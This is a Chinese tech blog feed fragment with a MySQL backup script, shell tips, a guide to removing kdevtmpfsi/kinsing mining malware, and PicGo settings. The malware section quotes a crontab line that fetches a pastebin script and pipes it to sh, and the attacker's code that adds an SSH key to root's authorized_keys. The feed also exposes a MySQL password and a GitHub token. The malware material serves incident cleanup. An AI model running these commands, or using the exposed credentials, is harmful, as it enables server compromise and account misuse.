class="meta">#</span><span class="bash"> MYSQL Parameters</span></span><br><span class="line">MYSQL_UNAME=&quot;syscorer&quot;</span><br><span class="line">MYSQL_PWORD=&quot;s6stest2n3gz&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">credentialsFile=&quot;mysql-credentials.cnf&quot;</span><br><span class="line">echo &quot;[client]&quot; &gt; $credentialsFile</span><br><span class="line">echo &quot;user=$MYSQL_UNAME&quot; &gt;&gt; $credentialsFile</span><br><span class="line">echo &quot;password=$MYSQL_PWORD&quot; &gt;&gt; $credentialsFile</span><br><span class="line">echo &quot;host=localhost&quot; &gt;&gt; $credentialsFile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">&#x27;t backup databases with these names</span></span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> Example: starts with mysql (^mysql) or ends with _schema (_schema$)</span></span><br><span class="line">IGNORE_DB=&quot;(^mysql|_schema|sys$)&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> include mysql and mysqldump binaries <span class="keyword">for</span> cron bash user</span></span><br><span class="line">PATH=$PATH:/usr/local/mysql/bin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Number of days to keep backups</span></span><br><span class="line">KEEP_BACKUPS_FOR=7 #days</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> METHODS</span></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> YYYY-MM-DD</span></span><br><span class="line">TIMESTAMP=$(date +%F)</span><br><span class="line"></span><br><span class="line">function delete_old_backups()</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;Deleting $BACKUP_DIR/*.sql.gz older than $KEEP_BACKUPS_FOR days&quot;</span><br><span class="line">  find $BACKUP_DIR -type f -name &quot;*.sql.gz&quot; -mtime +$KEEP_BACKUPS_FOR -exec rm -rf &#123;&#125; \;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function mysql_login() &#123;</span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="built_in">local</span> mysql_login=<span class="string">&quot;-u <span class="variable">$MYSQL_UNAME</span>&quot;</span></span> </span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$MYSQL_PWORD</span>&quot;</span> ]; <span class="keyword">then</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash">   <span class="built_in">local</span> mysql_login+=<span class="string">&quot; -p<span class="variable">$MYSQL_PWORD</span>&quot;</span></span> </span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">fi</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$mysql_login</span></span></span><br><span class="line">  local mysql_login=&quot;--defaults-extra-file=$credentialsFile&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function database_list() &#123;</span><br><span class="line">  local show_databases_sql=&quot;SHOW DATABASES WHERE \`Database\` NOT REGEXP &#x27;$IGNORE_DB&#x27;&quot;</span><br><span class="line">  echo $(mysql $(mysql_login) -e &quot;$show_databases_sql&quot;|awk -F &quot; &quot; &#x27;&#123;if (NR!=1) print $1&#125;&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function echo_status()&#123;</span><br><span class="line">  printf &#x27;\r&#x27;; </span><br><span class="line">  printf &#x27; %0.s&#x27; &#123;0..100&#125; </span><br><span class="line">  printf &#x27;\r&#x27;; </span><br><span class="line">  printf &quot;$1&quot;&#x27;\r&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function backup_database()&#123;</span><br><span class="line">    backup_file=&quot;$BACKUP_DIR/$TIMESTAMP.$database.sql.gz&quot; </span><br><span class="line">    output+=&quot;$database =&gt; $backup_file\n&quot;</span><br><span class="line">    echo_status &quot;...backing up $count of $total databases: $database&quot;</span><br><span class="line">    $(mysqldump $(mysql_login) $database | gzip -9 &gt; $backup_file)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function backup_databases()&#123;</span><br><span class="line">  local databases=$(database_list)</span><br><span class="line">  local total=$(echo $databases | wc -w | xargs)</span><br><span class="line">  local output=&quot;&quot;</span><br><span class="line">  local count=1</span><br><span class="line">  for database in $databases; do</span><br><span class="line">    backup_database</span><br><span class="line">    local count=$((count+1))</span><br><span class="line">  done</span><br><span class="line">  echo -ne $output | column -t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hr()&#123;</span><br><span class="line">  printf &#x27;=%.0s&#x27; &#123;1..100&#125;</span><br><span class="line">  printf &quot;\n&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RUN SCRIPT</span></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line">delete_old_backups</span><br><span class="line">hr</span><br><span class="line">backup_databases</span><br><span class="line">hr</span><br><span class="line">printf &quot;All backed up!\n\n&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>复制上面的脚本文件到目录: <code>/opt/backup/scripts/mysql_backup.sh</code>,执行如下命令赋予执行权限：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x mysql_backup.sh</span><br></pre></td></tr></table></figure><ul><li>执行如下命令，测试脚本是否正常:</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./mysql_backup.sh</span><br></pre></td></tr></table></figure><h2 id="SSH-或者telent登录linux后screen后台运行脚本"><a href="#SSH-或者telent登录linux后screen后台运行脚本" class="headerlink" title="SSH 或者telent登录linux后screen后台运行脚本"></a>SSH 或者telent登录linux后screen后台运行脚本</h2><p>Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。后台运行命令。</p><p>在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。</p><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install screen</span><br></pre></td></tr></table></figure><ul><li>命令说明</li></ul><ol><li>执行<code>screen</code>即可打开一个session，或者加上参数<code>-s</code>设置一个session的名称（推荐):</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">screen</span><br><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls         -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到切换yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>快捷键</li></ul><ol><li><p>CTRL - a+d -&gt;(<strong>常用退出切换到后台运行</strong>) detach命令，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。</p></li><li><p><del>CTRL- a+z -&gt; 把当前session放到后台执行，用 shell 的 fg 命令则可回去，基本没有用到</del>。</p></li><li><p><code>screen -X -S 28835 quit</code>-&gt; 删除对应的session，其中的<code>28835</code>是通过命令<code>screen -ls</code>查看到的对应session的id。</p></li></ol><h2 id="shell脚本中-gt-dev-null-2-gt-amp-1"><a href="#shell脚本中-gt-dev-null-2-gt-amp-1" class="headerlink" title="shell脚本中&gt;/dev/null 2&gt;&amp;1"></a>shell脚本中&gt;/dev/null 2&gt;&amp;1</h2><p>参考文档： <a href="https://www.cnblogs.com/youjianjiangnan/p/11561805.html" target="_blank" rel="noopener">https://www.cnblogs.com/youjianjiangnan/p/11561805.html</a></p><p><code>&gt;/dev/null</code> 这条命令的作用是将标准输出1重定向到/dev/null中。 /dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了&gt;/dev/null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。<br><code>2&gt;&amp;1</code> 这条命令用到了重定向绑定，采用&amp;可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，<strong>说人话就是错误输出将会和标准输出输出到同一个地方</strong>。</p><p>linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令，所以&gt;/dev/null 2&gt;&amp;1的作用就是让<strong>标准输出重定向到/dev/null中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了/dev/null中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中</strong>。</p><h3 id="nohup结合"><a href="#nohup结合" class="headerlink" title="nohup结合"></a>nohup结合</h3><p>我们经常使用nohup command &amp;命令形式来启动一些后台程序，比如一些java服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nohup java -jar xxxx.jar &amp;</span><br></pre></td></tr></table></figure><p>为了不让一些执行信息输出到前台（控制台），我们还会加上刚才提到的&gt;/dev/null 2&gt;&amp;1命令来丢弃所有的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nohup java -jar xxxx.jar &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>总而言之，在工作中用到最多的就是<code>nohup command &gt;/dev/null 2&gt;&amp;1 &amp;</code>命令</p><h2 id="挖矿木马病毒清理"><a href="#挖矿木马病毒清理" class="headerlink" title="挖矿木马病毒清理"></a>挖矿木马病毒清理</h2><p>问题： 无意在使用<code>top</code>命令的时候发现一个异常进程: <code>kdevtmpfsi</code>,使用<code>ps -aux | grep kdevtmpfsi</code>,发现对应的执行文件路径是: <code>/tmp/kdevtmpfsi</code>. 然后尝试<code>kill -9</code>杀死进程后，再<code>rm -rf /tmp/kdevtmpfsi</code>还是会死而复生。</p><h3 id="木马解析"><a href="#木马解析" class="headerlink" title="木马解析"></a>木马解析</h3><ol><li>木马解析： <a href="https://xz.aliyun.com/t/4386" target="_blank" rel="noopener">https://xz.aliyun.com/t/4386</a>, <a href="https://my.oschina.net/u/4437985/blog/3168526" target="_blank" rel="noopener">https://my.oschina.net/u/4437985/blog/3168526</a> (推荐)</li></ol><p>一般在定时任务（<code>crontab -l</code>）中存在异常脚本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@mdw ~]# crontab -l</span><br><span class="line">*&#x2F;15 * * * * （curl -fsSL https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;xmxHzu5P||wget -q -O- https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;xmxHzu5P)|sh</span><br></pre></td></tr></table></figure><p>1). 攻击者通过网络进入第一台被感染的机器(redis未认证漏洞、ssh密码泄露登录等)。<br>2). 第一台感染的机器会读取known_hosts文件，遍历ssh登录，如果是做了免密登录认证，则将直接进行横向传播。<br>3). 修改/etc/cron.d/root文件，增加定时任务<br>4). kill掉同类挖矿进程<br>5). kill掉高好资源的其他进程<br>6). 下载执行主恶意程序kerberods<br>7). 拉起khugepageds挖矿进程<br>8). 为文件添加chattr锁定<br>9). 修改IPTABLES<br>10). 清除日志<br>11). 关闭SELinux<br>12). 还有个后门，创建/root/.ssh/authorized_keys，添加病毒作者自己的公钥，保证其可以使用SSH登录到服务器，具体代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chmod 700 &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">echo &gt;&gt; &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chmod 600 root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI&#x2F;oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb&#x2F;ohYSBb7pK&#x2F;2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17&quot; &gt;&gt; &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="木马分析"><a href="#木马分析" class="headerlink" title="木马分析"></a>木马分析</h3><ol><li>继续查看对应的定时任务目录<code>nano /etc/crontab</code>,发现没有对应的病毒形式的定时任务。继续查看用户目录下的定时任务: <code>/var/spool/cron/</code>也没有发现非法的定时任务。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nano &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br><span class="line"></span><br><span class="line">nano &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br><span class="line"></span><br><span class="line">nano &#x2F;etc&#x2F;cron.d&#x2F;root</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><p>这个线程重复启动的原因是<strong>它还有一个守护线程在运行</strong>，检测到这个线程挂掉的时候就去重新启动，从而导致我们周而复始的出现这个问题。PS： 通过 <code>ps -ef</code> 命令查出 <code>kdevtmpfsi</code> 进程号，直接 kill -9 进程号并删除 /tmp/kdevtmpfsi 执行文件。但没有过1分钟进程又运行了，这时就能想到，kdevtmpfsi 有守护程序或者有计划任务。通过 crontab -l 查看是否有可疑的计划任务。</p></li><li><p>找到线程和守护线程<br>根据上面结果知道 kdevtmpfsi 进程号是 10393，使用 <code>systemctl status 10393</code> 发现 <code>kdevtmpfsi</code> 有守护进程<br>kill 掉 kdevtmpfsi 守护进程 kill -9 30903 30904，再 killall -9 kdevtmpfsi 挖矿病毒，最后删除 kdevtmpfsi 执行程序 rm -f /tmp/kdevtmpfsi</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pstree -a</span><br><span class="line">netstat -natp</span><br></pre></td></tr></table></figure><p>这时候我们就可以找到kdevtmpfsi线程 和它的守护线程<code>kinsing</code>.直接kill线程和它的守护线程:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep curl</span><br><span class="line">ps -aux|grep kinsing</span><br><span class="line">ps -aux|grep kdevtmpfsi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kill -9 19128</span><br><span class="line">kill -9 3722</span><br><span class="line">rm -rf &#x2F;tmp&#x2F;kdevtmpfsi</span><br><span class="line">rm -rf &#x2F;var&#x2F;tmp&#x2F;kinsing</span><br><span class="line">find &#x2F; -name &quot;kinsing*&quot; | xargs rm -rf</span><br><span class="line">find &#x2F; -name kdevtmpfsi | xargs rm -rf</span><br><span class="line">rm -f &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><ol start="4"><li>查找可疑定时任务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 首先停止cron服务，避免因其不断执行而导致恶意文件反复下载执行。如果操作系统可以使用service命令</span><br><span class="line">systemctl stop cron</span><br><span class="line">crontab -l 查看定时任务</span><br><span class="line">crontab -r 表示删除用户的定时任务，当执行此命令后，所有用户下面的定时任务会被删除</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191227100428997.png" alt="https://img-blog.csdnimg.cn/20191227100428997.png"></p><p>删除可以定时任务<code>crontab -e</code>,编辑删除定时任务即可。</p><ol start="5"><li>安全加固</li></ol><p>5.1. SSH<br>① 谨慎做免密登录<br>② 不使用默认的22端口<br>③ 禁止root登录</p><p>5.2. Redis<br>① 增加授权认证(requirepass参数)<br>② 尽量使用docker版本(docker pull redis)<br>③ 隐藏重要的命令</p><p>5.3 使用busybox删除</p><p>5.4 屏蔽<code>pastebin.com</code>、thrysi.com等广泛被挖矿蠕虫利用的网站，达到阻断入侵的目的</p><p>5.6 <code>netstat -natp</code> 命令查看是否有异常陌生IP的TCP连接，查询到有来自国外的陌生IP，做了白名单处理</p><p>5.7 启用ssh公钥登陆，禁用密码登陆。<br>5.8 云主机：完善安全策略，入口流量，一般只开放 80 443 端口就行，出口流量默认可以不限制，如果有需要根据需求来限制。物理机：可以通过硬件防火墙或者机器上iptables 来开放出入口流量规则。<br>5.9 本机不是直接需要对外提供服务，可以拒绝外网卡入口所有流量，通过 jumper 机器内网登陆业务机器。</p><h3 id="常见非法的木马病毒"><a href="#常见非法的木马病毒" class="headerlink" title="常见非法的木马病毒"></a>常见非法的木马病毒</h3><table><thead><tr><th>挖矿病毒</th><th>正常文件</th><th>关联文件</th><th>原因</th></tr></thead><tbody><tr><td>kdevtmpfsi</td><td>kdevtmpfs</td><td>kinsing</td><td>最根本的原因是自己的redis 6379配置不当导致的。大家可以参考阿里云的Redis服务安全加固</td></tr><tr><td>Watchdogs</td><td>Watchdog</td><td></td><td></td></tr><tr><td>trace</td><td>trace</td><td></td><td></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;bin-bash-M-坏的解释器-没有那个文件或目录&quot;&gt;&lt;a href=&quot;#bin-bash-M-坏的解释器-没有那个文件或目录&quot; class=&quot;headerlink&quot; title=&quot;/bin/bash^M 坏的解释器 没有那个文件或目录&quot;&gt;&lt;/a&gt;/bin/ba</summary>
      
    
    
    
    <category term="操作系统" scheme="https://seniortesting.club/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="linux" scheme="https://seniortesting.club/tags/linux/"/>
    
    <category term="linux shell" scheme="https://seniortesting.club/tags/linux-shell/"/>
    
    <category term="linux命令" scheme="https://seniortesting.club/tags/linux%E5%91%BD%E4%BB%A4/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>测试基础理论知识</title>
    <link href="https://seniortesting.club/posts/ad11RcJ8SC/"/>
    <id>https://seniortesting.club/posts/ad11RcJ8SC/</id>
    <published>2021-03-25T15:08:10.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍一些基础的软件测试入门的理论知识.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文主要介绍一些基础的软件测试入门的理论知识.&lt;/p&gt;
</summary>
      
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="测试理论" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E7%90%86%E8%AE%BA/"/>
    
    
    <category term="测试" scheme="https://seniortesting.club/tags/%E6%B5%8B%E8%AF%95/"/>
    
    <category term="测试理论" scheme="https://seniortesting.club/tags/%E6%B5%8B%E8%AF%95%E7%90%86%E8%AE%BA/"/>
    
    <category term="软件测试" scheme="https://seniortesting.club/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>mysql基础问题整理</title>
    <link href="https://seniortesting.club/posts/b4YEEFiEWo/"/>
    <id>https://seniortesting.club/posts/b4YEEFiEWo/</id>
    <published>2021-03-25T11:24:34.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<p>整理一些常见的高频mysql相关的问题</p><h2 id="数据库里存时间是存long型的毫秒数好，还是日期格式好？"><a href="#数据库里存时间是存long型的毫秒数好，还是日期格式好？" class="headerlink" title="数据库里存时间是存long型的毫秒数好，还是日期格式好？"></a>数据库里存时间是存long型的毫秒数好，还是日期格式好？</h2><p>我个人觉得是long型的毫秒数最好，可以显著提高数据库的查询速度，简化代码编写</p><h2 id="定位查询可以是任意查询SQL"><a href="#定位查询可以是任意查询SQL" class="headerlink" title="定位查询可以是任意查询SQL"></a>定位查询可以是任意查询SQL</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WITH</span> CTE_TEMP   <span class="comment">--公用表表达式（Common Table Expression)</span></span><br><span class="line"><span class="keyword">as</span>(</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">FROM</span> ProvinceCity_Test <span class="keyword">where</span> <span class="keyword">value</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%西安%&#x27;</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> a.<span class="operator">*</span> <span class="keyword">FROM</span> ProvinceCity_Test a</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> CTE_TEMP b <span class="keyword">ON</span> a.ID <span class="operator">=</span> b.ParentID    <span class="comment">--父子级关系,递归,递归部分不允许使用外部联接(不允许使用left join等)</span></span><br><span class="line">)  </span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> CTE_TEMP   <span class="comment">-- CTE后面必须直接跟使用CTE的SQL语句（如select、insert、update等），否则，CTE将失效。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>递归查询中查询结果分隔符</li></ul><p><a href="https://blog.csdn.net/dufemt/article/details/80773394" target="_blank" rel="noopener">参考递归查询结果分隔符</a></p><p><img src="https://img-blog.csdn.net/20180622145111389?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1ZmVtdA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="alter"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">RECURSIVE</span> cte <span class="keyword">as</span></span><br><span class="line">(</span><br><span class="line"><span class="keyword">select</span> a.id,<span class="built_in">cast</span>(a.name <span class="keyword">as</span> <span class="type">varchar</span>(<span class="number">100</span>)) <span class="keyword">from</span> tb a <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;002&#x27;</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> </span><br><span class="line"><span class="keyword">select</span> k.id,<span class="built_in">cast</span>(c.name<span class="operator">||</span><span class="string">&#x27;&gt;&#x27;</span><span class="operator">||</span>k.name <span class="keyword">as</span> <span class="type">varchar</span>(<span class="number">100</span>)) <span class="keyword">as</span> name  <span class="keyword">from</span> tb k <span class="keyword">inner</span> <span class="keyword">join</span> cte c <span class="keyword">on</span> c.id <span class="operator">=</span> k.pid</span><br><span class="line">)<span class="keyword">select</span> id,name <span class="keyword">from</span> cte ;</span><br></pre></td></tr></table></figure><h2 id="建表规范参考阿里巴巴手册"><a href="#建表规范参考阿里巴巴手册" class="headerlink" title="建表规范参考阿里巴巴手册"></a>建表规范参考阿里巴巴手册</h2><ol><li>UNSIGNED属性就是将数字类型无符号化，与C、C++这些程序语言中的unsigned含义相同。例如，INT的类型范围是-2 147 483 648 ～ 2 147 483 647， INT UNSIGNED的范围类型就是0 ～ 4 294 967 295</li></ol><h2 id="mysql单索引和联合索引的区别"><a href="#mysql单索引和联合索引的区别" class="headerlink" title="mysql单索引和联合索引的区别"></a>mysql单索引和联合索引的区别</h2><blockquote><p>靠左原则</p></blockquote><p><a href="https://blog.csdn.net/Abysscarry/article/details/80792876" target="_blank" rel="noopener">参考文档</a></p><p>索引如何建立，及其如何使用，参考： <a href="https://www.toutiao.com/i6695892976922526212/" target="_blank" rel="noopener">https://www.toutiao.com/i6695892976922526212/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;整理一些常见的高频mysql相关的问题&lt;/p&gt;
&lt;h2 id=&quot;数据库里存时间是存long型的毫秒数好，还是日期格式好？&quot;&gt;&lt;a href=&quot;#数据库里存时间是存long型的毫秒数好，还是日期格式好？&quot; class=&quot;headerlink&quot; title=&quot;数据库里存时间是存</summary>
      
    
    
    
    <category term="数据库" scheme="https://seniortesting.club/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="mysql" scheme="https://seniortesting.club/tags/mysql/"/>
    
    <category term="数据库" scheme="https://seniortesting.club/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>picgo图床配置</title>
    <link href="https://seniortesting.club/posts/UQICSla0W2/"/>
    <id>https://seniortesting.club/posts/UQICSla0W2/</id>
    <published>2021-03-25T01:58:15.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="设置PicGo对应的GitHub仓库"><a href="#设置PicGo对应的GitHub仓库" class="headerlink" title="设置PicGo对应的GitHub仓库"></a>设置PicGo对应的GitHub仓库</h2><p>参考配置文档： <a href="https://picgo.github.io/PicGo-Doc/zh/guide/config.html#github%E5%9B%BE%E5%BA%8A" target="_blank" rel="noopener">https://picgo.github.io/PicGo-Doc/zh/guide/config.html#github%E5%9B%BE%E5%BA%8A</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 仓库名： **alterhu2020/StorageHub**</span><br><span class="line">2. token名称： **32bf780d196739f8923d210a227135462eb2ceb2**</span><br><span class="line">3. 仓库分支： **master**</span><br><span class="line">4. Github Path: **img/**</span><br><span class="line">5. Custom Url:  **https://cdn.jsdelivr.net/gh/alterhu2020/CDN@master**</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><table><thead><tr><th>OS</th><th>从剪切板上传图片</th><th>从资源管理器中上传图片</th><th>从弹出框中上传图片</th></tr></thead><tbody><tr><td>Windows/Unix</td><td><kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>U</kbd></td><td><kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>E</kbd></td><td><kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>O</kbd></td></tr><tr><td>OsX</td><td><kbd>Cmd</kbd> + <kbd>Opt</kbd> + <kbd>U</kbd></td><td><kbd>Cmd</kbd> + <kbd>Opt</kbd> + <kbd>E</kbd></td><td><kbd>Cmd</kbd> + <kbd>Opt</kbd> + <kbd>O</kbd></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;设置PicGo对应的GitHub仓库&quot;&gt;&lt;a href=&quot;#设置PicGo对应的GitHub仓库&quot; class=&quot;headerlink&quot; title=&quot;设置PicGo对应的GitHub仓库&quot;&gt;&lt;/a&gt;设置PicGo对应的GitHub仓库&lt;/h2&gt;&lt;p&gt;参考配置文档</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="图床" scheme="https://seniortesting.club/tags/%E5%9B%BE%E5%BA%8A/"/>
    
    <category term="picgo" scheme="https://seniortesting.club/tags/picgo/"/>
    
  </entry>
  
  <entry>
    <title>git常见问题和错误</title>
    <link href="https://seniortesting.club/posts/bvw8IzYNYF/"/>
    <id>https://seniortesting.club/posts/bvw8IzYNYF/</id>
    <published>2021-03-22T14:31:46.000Z</published>
